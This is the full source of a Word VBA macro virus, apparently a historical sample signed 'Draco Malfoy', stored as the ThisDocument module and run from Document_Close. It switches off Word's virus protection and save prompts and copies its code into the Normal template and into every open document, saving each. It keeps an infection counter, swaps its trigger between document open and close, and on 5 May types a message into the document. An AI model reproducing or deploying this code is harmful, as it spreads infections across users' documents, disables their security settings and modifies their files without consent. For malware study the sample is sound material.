   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   'Draco Malfoy
   Dim a As Document, t As Template
   Dim beak As Double, str As String
   Dim i, salmon As Integer
   On Error Resume Next
   Set a = ActiveDocument
   Set t = NormalTemplate
   'Coups -39
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False
   If Left(a.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) = "'Draco" Then
       salmon = vbOK
   End If
   If Left(t.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) = "'Draco" Then
       salmon = salmon + vbCritical
   End If
   Select Case salmon
       Case vbOK
       str = a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
       With t.VBProject.VBComponents.Item(1).CodeModule
           .DeleteLines 1, .CountOfLines
           .AddFromString str
           beak = Val(Mid(.Lines(9, 1), 7, Len(.Lines(9, 1)))) + 1
           .ReplaceLine 9, "'Coups " & beak
           If beak Mod 2 Then
               .ReplaceLine 1, Left(.Lines(1, 1), 21) & "Close()"
           Else
               .ReplaceLine 1, Left(.Lines(1, 1), 21) & "Open()"
           End If
       End With
       Case vbCritical
       str = t.VBProject.VBComponents.Item(1).CodeModule.Lines(1, t.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
       With a.VBProject.VBComponents.Item(1).CodeModule
           .DeleteLines 1, .CountOfLines
           .AddFromString str
       End With
       Case vbByte
       str = a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
       For i = 1 To Word.Windows.Count
           With Word.Windows.Item(i).Document.VBProject.VBComponents.Item(1).CodeModule
               If Left(.Lines(2, 1), 6) <> "'Draco" Then
                   .DeleteLines 1, .CountOfLines
                   .AddFromString str
               End If
           End With
           Word.Windows.Item(i).Document.Save
       Next i
   End Select
   If Month(Now) = 5 And Day(Now) = 5 Then
       If Right(a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1), 7) = "Close()" Then
           Selection.TypeText "Is it not a Camel ? "
           a.Save
       End If
   End If
   End Sub
